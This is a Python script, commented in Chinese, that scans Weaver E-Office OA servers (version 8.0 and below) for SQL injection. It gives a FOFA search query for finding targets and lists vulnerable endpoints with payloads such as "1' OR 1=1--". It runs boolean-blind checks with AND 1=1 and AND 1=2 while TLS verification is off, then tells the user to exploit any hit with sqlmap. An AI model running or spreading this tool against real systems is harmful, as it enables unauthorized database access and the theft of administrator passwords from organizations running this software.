#!/usr/bin/env python3
"""
泛微 E-Office SQL注入漏洞
- 影响版本: E-Office 8.0 及以下
- CVSS: 高危
- 类型: SQL 注入 → 管理员密码泄露
- 描述: 未授权访问，直接拼接 SQL 查询用户信息
FOFA: app="泛微-OA(E-Office)"
"""
import argparse, urllib.request, ssl, sys

BANNER = """
  泛微 E-Office SQL注入
  High | SQL Injection | 未授权
  影响: E-Office <= 8.0
"""

# 常见 E-Office SQLi 端点
SQLI_ENDPOINTS = [
    "/hrm/contract/HrmContractSpreadSheet.jsp?sqlwhere=1=1",
    "/general/attendance/manage/leave/leave_type.jsp?id=1",
    "/general/hr/employee/employeeView.jsp?id=1'",
    "/interface/DocFileDownload.jsp?filename=1' OR 1=1--",
    "/weaver/email/FileDownload.jsp?filename=1",
    "/pweb/AttParams.jsp?cfg=com.glAC&userid=1",
]

def check_sqli(url):
    """布尔盲注检测"""
    # 正常请求
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.urlopen(url, timeout=10, context=ctx)
        normal_len = len(req.read())
    except Exception as e:
        return None, str(e)

    # 注入 true
    true_url = url + "+AND+1=1"
    # 注入 false
    false_url = url + "+AND+1=2"

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req1 = urllib.request.urlopen(true_url, timeout=10, context=ctx)
        len1 = len(req1.read())
        req2 = urllib.request.urlopen(false_url, timeout=10, context=ctx)
        len2 = len(req2.read())
        if len1 != len2:
            return True, f"len1={len1}, len2={len2}"
        return False, f"len1={len1}, len2={len2}"
    except Exception as e:
        return None, str(e)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    print(f"\n[*] 目标: {target}")

    # 检测泛微 E-Office 指纹
    print("\n[*] 检测泛微 OA 指纹...")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.urlopen(target + "/login/Login.jsp", timeout=8, context=ctx)
        html = req.read().decode('utf-8', errors='ignore')
        if "weaver" in html.lower() or "泛微" in html:
            print("  [+] 泛微 OA 指纹确认")
    except:
        pass

    if args.check:
        print("\n[*] 检测 SQL 注入...")
        found = False
        for endpoint in SQLI_ENDPOINTS:
            url = target + endpoint
            is_sqli, detail = check_sqli(url)
            status = "候选" if is_sqli else detail[:40]
            print(f"  {'[+]' if is_sqli else '[-]'} {endpoint[:50]} -> {status}")
            if is_sqli:
                found = True
        if found:
            print("\n[+] 发现 SQL 注入点，请使用 sqlmap 深入利用")
        else:
            print("\n[-] 未发现明显 SQL 注入")

if __name__ == "__main__":
    main()
